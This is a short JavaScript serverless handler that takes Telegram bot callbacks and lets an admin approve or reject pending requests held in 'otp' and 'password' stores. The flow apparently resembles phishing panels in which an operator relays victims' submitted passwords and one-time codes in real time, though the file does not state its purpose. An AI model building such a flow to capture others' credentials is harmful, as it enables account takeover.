import { makeJsonResponse, getDataStore } from "../_shared.js";

export async function onRequest(context) {
  const { request, env } = context;
  if (request.method !== "POST") return makeJsonResponse({ error: "Method not allowed" }, 405);

  let body;
  try {
    body = await request.json();
  } catch (error) {
    return makeJsonResponse({ error: "Invalid JSON" }, 400);
  }

  const update = body;
  if (!update || !update.callback_query) {
    return makeJsonResponse({ ok: true });
  }

  const callbackQuery = update.callback_query;
  const data = new URLSearchParams(callbackQuery.data);
  const requestId = data.get("requestId");
  const action = data.get("action");
  const token = data.get("token");

  if (token !== env.TELEGRAM_CALLBACK_TOKEN) {
    return makeJsonResponse({ ok: false, error: "Invalid token" }, 401);
  }

  const otpStore = getDataStore("otp");
  const pwStore = getDataStore("password");

  const apply = (store) => {
    if (!store.has(requestId)) return false;
    const item = store.get(requestId);
    if (action === "approve") {
      item.approved = true;
      item.rejectedReason = null;
    } else if (action === "reject") {
      item.rejectedReason = "Admin rejected";
      item.approved = false;
    }
    store.set(requestId, item);
    return true;
  };

  if (!apply(otpStore) && !apply(pwStore)) {
    return makeJsonResponse({ ok: false, error: "Request not found" }, 404);
  }

  return makeJsonResponse({ ok: true });
}
